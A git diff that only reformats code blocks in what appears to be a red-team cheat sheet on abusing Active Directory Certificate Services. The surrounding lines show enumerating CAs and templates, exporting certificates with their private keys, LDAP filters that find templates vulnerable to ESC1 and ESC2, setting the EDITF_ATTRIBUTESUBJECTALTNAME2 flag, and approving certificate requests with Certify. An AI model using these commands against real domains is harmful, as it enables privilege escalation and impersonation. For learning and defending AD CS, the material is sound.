@@ -9,7 +9,7 @@
 * <mark style="color:green;">**CAPI**</mark> : CryptoAPI
 * <mark style="color:green;">**CNG**</mark> : Cryptography API: Next Generation
 
-#### EKU OIDs that can enable certificate authentication:
+#### <mark style="color:green;">EKU OIDs that can enable certificate authentication:</mark>
 
 | Description                  | OID                      |
 | ---------------------------- | ------------------------ |
@@ -23,16 +23,16 @@
 
 Enumerate AD Enterprise CAs and their settings with LDAP:
 
-```
-PS > $CAs = Get-ADObject -LDAPFilter '(objectCategory=pKIEnrollmentService)' -SearchBase "CN=Configuration,DC=tinycorp,DC=net"
-PS > $CAs
+```powershell
+$CAs = Get-ADObject -LDAPFilter '(objectCategory=pKIEnrollmentService)' -SearchBase "CN=Configuration,DC=tinycorp,DC=net"
+$CAs
 ```
 
 Get list of template names:
 
-```
-PS > $CATemplateNames = Get-ADObject $CAs[0].DistinguishedName -Properties certificatetemplates | Select-Object -ExpandProperty certificatetemplates
-PS > $CATemplateNames
+```powershell
+$CATemplateNames = Get-ADObject $CAs[0].DistinguishedName -Properties certificatetemplates | Select-Object -ExpandProperty certificatetemplates
+$CATemplateNames
 Or
 $ windapsearch --dc 192.168.1.11 -d megacorp.local -u snovvcrash -p 'Passw0rd!' -m custom --filter '(objectCategory=pKIEnrollmentService)' --base 'CN=Configuration,DC=megacorp,DC=local' --attrs dn,dnshostname
 $ windapsearch --dc 192.168.1.11 -d megacorp.local -u snovvcrash -p 'Passw0rd!' -m custom --filter '(distinguishedName=CN=CA01,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=megacorp,DC=local)' --base 'CN=Configuration,DC=megacorp,DC=local' --attrs certificateTemplates
@@ -57,8 +57,8 @@ With certmgr:
 
 With PowerShell:
 
-```
-PS > Export-PfxCertificate -Password (Read-Host -AsSecureString -Prompt 'Password') -Cert (Get-Item -Path Cert:\LocalMachine\My\<CERT_THUMBPRINT>) -FilePath cert.pfx -Verbose
+```powershell
+ Export-PfxCertificate -Password (Read-Host -AsSecureString -Prompt 'Password') -Cert (Get-Item -Path Cert:\LocalMachine\My\<CERT_THUMBPRINT>) -FilePath cert.pfx -Verbose
 ```
 
 With [CertStealer](https://github.com/TheWover/CertStealer):
@@ -124,7 +124,7 @@ Some other certificate-related file extensions:
 
 List EKUs for a certificate with PowerShell:
 
-```
+```powershell
 PS > $CertPath = "C:\Users\snovvcrash\cert.pfx"
 PS > $CertPass = "Passw0rd!"
 PS > $Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass)
@@ -139,7 +139,7 @@ Cmd > certutil.exe -dump -v cert.pfx
 
 Correlate a certificate with a CA thumbprint on the host and in AD:
 
-```
+```powershell
  # Get cert's thumbprint
 PS > $CertPath = "C:\Users\snovvcrash\cert.p12"
 PS > $CertPass = "Passw0rd!"
@@ -173,7 +173,7 @@ Condition: the vulnerable certificate template allows requesters to specify a SA
 
 Find template with this misconfiguration:
 
-```
+```powershell
 PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
 ```
 
@@ -189,7 +189,7 @@ Condition: the vulnerable certificate template allows requesters to specify a SA
 
 Find template with this misconfiguration:
 
-```
+```powershell
 PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
 ```
 
@@ -270,7 +270,7 @@ Cmd > certutil.exe -config "CA01.megacorp.local\CA01" -setreg "policy\EditFlags"
 
 Enumarate CA ACEs with Powershell [PSPKI](https://github.com/PKISolutions/PSPKI):
 
-```
+```powershell
 PS > Install-Module -Name PSPKI
 PS > Import-Module PSPKI
 PSPKI > Get-CertificationAuthority -ComputerName CA01.megacorp.local | Get-CertificationAuthorityAcl | select -ExpandProperty access
@@ -280,7 +280,7 @@ PSPKI > Get-CertificationAuthority -ComputerName CA01.megacorp.local | Get-Certi
 
 The "CA Administrator" role allows to set the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (see **ESC6**):
 
-```
+```powershell
  # Check before setting the flag
 Cmd > hostname
 DC01
@@ -303,7 +303,7 @@ Cmd > certutil.exe -config "CA01.megacorp.local\CA01" -getreg "policy\EditFlags"
 
 The "Certificate Manager" role allows to remotely approve pending certificate requests which can by used by an adversary to subvert the "CA certificate manager approval" protection:
 
-```
+```powershell
  # Request a certificate that requires manager approval with Certify
 PS > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:ApprovalNeeded
 ...
